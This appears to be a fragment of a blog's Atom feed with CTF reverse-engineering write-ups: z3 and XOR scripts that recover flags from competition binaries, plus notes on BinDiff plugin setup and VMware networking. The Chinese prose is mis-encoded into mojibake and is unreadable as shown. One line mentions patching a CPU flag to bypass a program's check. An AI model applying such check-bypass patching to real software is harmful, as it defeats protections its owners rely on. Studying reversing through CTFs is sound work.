    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Login-1"><a href="#Login-1" class="headerlink" title="Login-1"></a>Login-1</h2><p>æ–¹ç¨‹åªèƒ½è§£ä¸€åŠï¼Œè¿˜å¾—æ‰‹åŠ¨</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884342433-1f41b761-935d-4556-ab80-c1a713e7eff2.png" class="" title="img"><p>ä¸€å¼€å§‹åšçš„æ—¶å€™ç›´æ¥hide castsäº†</p><p>åé¢å‘ç°è¿˜å¯ä»¥ç”¨abcdè¡¨ç¤ºæ¯ä¸€ä½ç„¶ååˆ†æ®µè§£z3</p><p>è·‘ä¸ªä¸¤åˆ†é’Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>a = Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>b = Int(<span class="hljs-string">&#x27;b&#x27;</span>)<br><br>solver = Solver()<br><br>solver.add(a * b == <span class="hljs-number">342772773</span>)<br>solver.add(a + b == <span class="hljs-number">39526</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution&quot;</span>)<br><br><br>a, b, c, d, e, f, g, h = Ints(<span class="hljs-string">&#x27;a b c d e f g h&#x27;</span>)<br><br><br>solver = Solver()<br><br><br>solver.add((d * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>)) + (c * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>)) + (b * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + a - (<br>            (h * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>)) + (g * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>)) + (f * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + e) == <span class="hljs-number">1005712381</span>)<br>solver.add((b * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + a + (d * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + c == <span class="hljs-number">56269</span>)<br>solver.add((f * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + e - (h * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) - g == <span class="hljs-number">15092</span>)<br>solver.add(a * e == <span class="hljs-number">10710</span>)<br>solver.add(c * g == <span class="hljs-number">12051</span>)<br>solver.add(d + h == <span class="hljs-number">172</span>)<br><br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a =&quot;</span>, <span class="hljs-built_in">chr</span>(m[a].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b =&quot;</span>, <span class="hljs-built_in">chr</span>(m[b].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, <span class="hljs-built_in">chr</span>(m[c].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>, <span class="hljs-built_in">chr</span>(m[d].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, <span class="hljs-built_in">chr</span>(m[e].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;f =&quot;</span>, <span class="hljs-built_in">chr</span>(m[f].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;g =&quot;</span>, <span class="hljs-built_in">chr</span>(m[g].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;h =&quot;</span>, <span class="hljs-built_in">chr</span>(m[h].as_long()))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution&quot;</span>)<br><br>a, b=Ints(<span class="hljs-string">&#x27;a b&#x27;</span>)<br>solver = Solver()<br>solver.add(a * b == <span class="hljs-number">171593250</span>)<br>solver.add(a + b == <span class="hljs-number">26219</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><br>a, b=Ints(<span class="hljs-string">&#x27;a b&#x27;</span>)<br>solver = Solver()<br>solver.add(a * b == <span class="hljs-number">376306868</span>)<br>solver.add(a + b == <span class="hljs-number">40341</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><span class="hljs-comment">#5h12fggtisu89521ad49</span><br></code></pre></td></tr></table></figure><h2 id="babypy-2"><a href="#babypy-2" class="headerlink" title="babypy-2"></a>babypy-2</h2><p>ç»™äº†ä¸€ä¸ªpyd</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884478416-3cfe8548-e269-49e7-bb9c-0642544cfa00.png" class="" title="img">ä¸èƒ½ç›´æ¥åç¼–è¯‘æˆpython<img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711895753542-a7db57f4-5035-4dbd-a420-e732ee281bcc.png" class="" title="img"><p>è®°å¾—pythonç‰ˆæœ¬è¯´æ˜¯3.11ä½†æ˜¯uncompyle6ä¸èƒ½åç¼–è¯‘æˆc?</p><p>æ‰¾å­—ç¬¦ä¸²å‘ç°è¿™ä¸ªå¯èƒ½æ˜¯keyæˆ–è€…iv</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884609846-4b4f8f6b-ced3-4e49-b34f-d499f586a822.png" class="" title="img"><p>æ„Ÿè§‰æ˜¯keyå’Œivï¼Œä½†æ˜¯æ€ä¹ˆè§£éƒ½ä¸å¯¹</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884688531-2864ddf1-b4b6-42c3-a51b-3b79b5d8fb74.png" class="" title="img"><p>ä¼°è®¡æ˜¯ç®—æ³•é‡Œé¢æŠŠkeyå¼‚æˆ–äº†æˆ–è€…å•¥çš„</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884755336-79019275-71d1-4c3d-8cc9-2bab789508de.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>cython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BinDiffæ’ä»¶çš„æŠ¥é”™ä¸è§£å†³</title>
    <link href="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/"/>
    <url>/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ¥BinDiffæ’ä»¶å¾ˆå¤šéƒ½æ˜¯è‡ªå¸¦çš„ï¼Œå³ä½¿å®‰è£…ä¹Ÿå¾ˆå®¹æ˜“ï¼Œä½†æ˜¯æˆ‘çš„dllæ–‡ä»¶æ— è®ºæ”¾åœ¨pluginsç›®å½•ä¸‹è¿˜æ˜¯å®‰è£…bindiffé»˜è®¤åˆ›å»ºçš„IDAProæ–‡ä»¶å¤¹éƒ½ä¸è¡Œ</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402161514589.png" class="" title="image-20240402161514589"><p>åœ¨å­¦é•¿çš„æé†’ä¸‹å»çœ‹è¾“å‡ºçª—å£çš„æŠ¥é”™</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171654588.png" class="" title="image-20240402171654588"><p>é‚£ä¼°è®¡æ˜¯å…ˆç”¨åŸæ¥ç³»ç»Ÿé‡Œæœ‰çš„dllï¼Œåˆ äº†å°±è¡Œ</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171858007.png" class="" title="image-20240402171858007"><p>å‘ç°å·²ç»å»idaç›®å½•ä¸‹æ‰¾äº†</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171402419.png" class="" title="image-20240402171402419"><p>æˆåŠŸ</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171446940.png" class="" title="image-20240402171446940"><p>ç›´æ¥æŠŠdllæ”¾åˆ°å¯¹åº”idaç›®å½•ä¸‹ï¼Œå‘ç°å¤šç‰ˆæœ¬idaéƒ½èƒ½ç”¨äº†</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºç½‘ç»œè®¾ç½®</title>
    <link href="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <url>/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>åˆ é™¤åŸæ¥natæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼Œæ–°å»ºä¸€å¼ è™šæ‹Ÿç½‘å¡ï¼Œå¦‚vmnet0å¯ä½¿å¤šå°è™šæ‹Ÿæœºå’Œä¸»æœºåœ¨åŒä¸€ç½‘æ®µä¸Š</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711506464849-2874c590-9c49-4934-b30e-1c43ec6687d4.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1708495363780-e2a4e9b5-6bd9-429d-98ae-e1d47c8da120.png" class="" title="img"><p>é€‰æ‹©ä¸€å¼ è™šæ‹Ÿç½‘å¡ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©æ¡¥æ¥æ¨¡å¼ï¼Œæˆ–è€…ä¸‹é¢çš„è‡ªå®šä¹‰é€‰æ‹©å¯¹åº”ç½‘å¡ä¹Ÿè¡Œ</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711466152376-87b6d4a4-00a6-4117-90b1-5a8d0d2928ee.png" class="" title="img"><p>åé¢æˆ‘å°±å‡ºç°äº†ipä¸å†æ˜¯è™šæ‹Ÿçš„192.168.15.1ï¼Œä½†æ˜¯ä¸»æœºè¿˜æ˜¯èƒ½pingé€šçš„æƒ…å†µï¼Œå…¶å®ä¹‹å‰ä¸€ç›´æ˜¯æ­£å¸¸çš„ï¼Œä¸çŸ¥é“å’‹äº†åˆè¿˜åŸæˆ172.17.0.1,åŒå­¦è¯´å¯èƒ½æ˜¯æ¡¥æ¥ä¼šå›ºå®šä¸€æ®µæ—¶é—´è¿˜åŸå•¥çš„</p><p>åé¢ä¹Ÿé‡åˆ°äº†è™šæ‹Ÿæœºå¿«ç…§æ‰“ä¸å¼€çš„æƒ…å†µ</p><p><a href="https://blog.csdn.net/qq_45771413/article/details/121230747">https://blog.csdn.net/qq_45771413/article/details/121230747</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711516508625-7ce053f6-dc2a-4d28-94a4-fdfb2e8d9aa3.png" class="" title="img"><p>æœ€åæŠŠç½‘ç»œé€‚é…å™¨å…¨éƒ¨è¿˜åŸæˆé»˜è®¤çš„ï¼Œå†æŒ‰ç…§æ•™ç¨‹å…¨éƒ¨è®¾ç½®æˆNAT</p><p><a href="https://zhuanlan.zhihu.com/p/479522879">https://zhuanlan.zhihu.com/p/479522879</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711519056690-363480f0-5b01-4803-a93e-d9cc77b92531.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711521124605-41af9189-016e-467d-a9a2-b3a3b1af398b.png" class="" title="img"><p>å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œæˆ‘çœŸçš„â€¦</p><p>å†æ¬¡æ¢å¤å¿«ç…§ï¼Œç«Ÿç„¶æˆäº†ï¼Œæ‰€ä»¥è¿˜å¾—æ˜¯æ‹å¿«ç…§</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BeginCTF2024éƒ¨åˆ†é€†å‘</title>
    <link href="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/"/>
    <url>/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="real-xor"><a href="#real-xor" class="headerlink" title="real_xor"></a>real_xor</h2><p>ç»™çš„pythonï¼Œä¸€çœ¼å¾ªç¯å¼‚æˆ–</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768782798-eec1722c-ad82-437c-910b-c5bec0b5e2a7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768772317-486bf981-83da-4045-bba6-ab4b7bdc6fbf.png" class="" title="img"><h2 id="xor-1"><a href="#xor-1" class="headerlink" title="xor-1"></a>xor-1</h2><p>å…ˆè„±å£³</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769025393-674705ad-19fe-4c58-b922-5ad9534aecf9.png" class="" title="img"><p>æœå­—ç¬¦ä¸²æ‰¾åˆ°å¯†æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769305346-03366f20-0aa3-4f9d-b7f9-34f304e56d7e.png" class="" title="img"><p>ä»startè¿›å…¥ï¼Œæ‰¾åˆ°code</p><p>å¤åˆ¶æ•°å­—å’Œæ˜æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5-171031959456491.png" class="" title="img"><p>å¼‚æˆ–æ•°å­—</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5.png" class="" title="img"><p>åå‘å¼‚æˆ–ï¼Œå…¶å®ä¼ªcæ˜¯å¾ˆå¥‡æ€ªçš„i&#x3D;0ï¼Œä¸‹æ ‡ä¸º16ï¼Œä½†æ˜¯çœ‹æ±‡ç¼–ç¡®å®æ˜¯è¿™æ ·</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771152553-c42a1f1b-5dee-40ee-b4eb-9e30175b2302.png" class="" title="img"><p>è€Œä¸”cç”¨16æ¥ç®—å°±æ˜¯å¯¹çš„</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395333436-2cec64dd-319f-4d7a-9dcc-de5a5b096cdf.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771290662-3a9f9e22-8956-4a79-92e3-561d8416c75e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771400265-4ff2b282-a49c-44a2-86fb-3aa642825f63.png" class="" title="img"><p>åˆæ¥ä¸€æ•´è½®</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771420376-7ce963ce-71da-49f4-9c99-e1c3e74fc6ad.png" class="" title="img"><p>ida7.5å¯ä»¥æ˜¾ç¤ºä¸­æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379783930-63154982-9c14-47c6-82e5-9c06f709b51c.png" class="" title="img"><p>å½“æ—¶å°±è¿™æ ·ï¼Œç›´æ¥ä¹±åº</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379763193-a6214394-7f51-43f0-8b96-9fee716c6e44.png" class="" title="img"><p>æˆ‘çŸ¥é“äº†ï¼Œæˆ‘å†™çš„è„šæœ¬æ˜¯ä¸€ä½ä¸€ä½çš„åŠ åˆ°flagé‡Œï¼Œè€Œç°å®æ˜¯16ä½ç®—å®Œç›´æ¥å¤åˆ¶çš„ï¼Œå½“ç„¶æœ‰ç‚¹é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªfæ²¡äº†</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707380357812-aba19fb3-0169-4122-938c-7aabf4d3660e.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python">fin = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>]<br><br>lst9 = fin[:<span class="hljs-number">16</span>]<br>lst8 = fin[<span class="hljs-number">16</span>:]<br><br>lst7 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;3092606632787947&quot;</span>]<br>lst6 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;4180387362590136&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst7[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst6[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[i]<br>    lst9[i] ^= lst7[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[i]<br>    lst9[i] ^= lst6[i]<br><br>lst4 = lst8<br>lst3 = lst9<br><br>lst1 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;6329079420771558&quot;</span>]<br>lst2 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;7679621386735000&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst2[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst1[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[i]<br>    lst4[i] ^= lst2[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[i]<br>    lst4[i] ^= lst1[i]<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst3 + lst4])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ç”¨åŠ¨è°ƒåšï¼š</p><p>æ¤°å¥¶å¸ˆå‚…è¯´æ˜¯è¦å»ç¬¦å·è¡¨ï¼Œè¿™é‡Œæœ¬æ¥å°±å»äº†ç¬¦å·ï¼Œä¸è¿‡é“¾æ¥å¥½çš„åœ°å€æ²¡æœ‰å»</p><p>ç¬¦å·é€šå¸¸æ˜¯å˜é‡æˆ–å‡½æ•°çš„åç§°,ç¬¦å·è¡¨å¯ç”¨äºç¡®å®šå˜é‡æˆ–å‡½æ•°åœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚</p><p>æ‰€ä»¥stripä¸€ä¸‹å¯ä»¥å»æ‰ï¼Œç°åœ¨å°±åªå‰©ä¸‹åç§»äº†ï¼Œè€Œä¸”å¯ä»¥ç›´æ¥åŠ¨è°ƒåˆ°å¯†æ–‡æ¯”è¾ƒå¤„</p><p><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383434998-9a474bb9-e10f-4823-a951-ebbe7fe2f827.jpeg" alt="img"><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395034732-b0682464-e242-4b37-b7de-45fd0a108417.png" alt="img"></p><p>çœŸçš„ä»0x7få¼€å¤´å˜æˆ0x14å¼€å¤´å•¦ï¼Œè€Œä¸”ç›´æ¥å‡º</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383301549-bd5bee30-fd55-482a-a992-8533746e42ba.png" class="" title="img"><h2 id="çº¢ç™½æœº-1"><a href="#çº¢ç™½æœº-1" class="headerlink" title="çº¢ç™½æœº-1"></a>çº¢ç™½æœº-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707102089423-4d5eba26-ab01-4192-91f8-188e179b233a.png" class="" title="img"><p>6502æ±‡ç¼–</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707112975854-4dec833c-428e-45f0-a499-d9a689ff1211.png" class="" title="img"><p>æ‰¾ä¸åˆ°flagå¤´</p><p>ç»“æœè·Ÿæˆ‘è¯´åœ¨çº¿ç½‘ç«™</p><p><a href="https://itema-as.github.io/6502js/">https://itema-as.github.io/6502js/</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707396837801-52015591-99fe-4d24-abd2-93172b05f129.png" class="" title="img"><h2 id="ä¿„è¯­å­¦ä¹ -1"><a href="#ä¿„è¯­å­¦ä¹ -1" class="headerlink" title="ä¿„è¯­å­¦ä¹ -1"></a>ä¿„è¯­å­¦ä¹ -1</h2><p>ç›´æ¥ä¹±è¾“ï¼Œç„¶åä¿®æ”¹zfç»•è¿‡</p><img 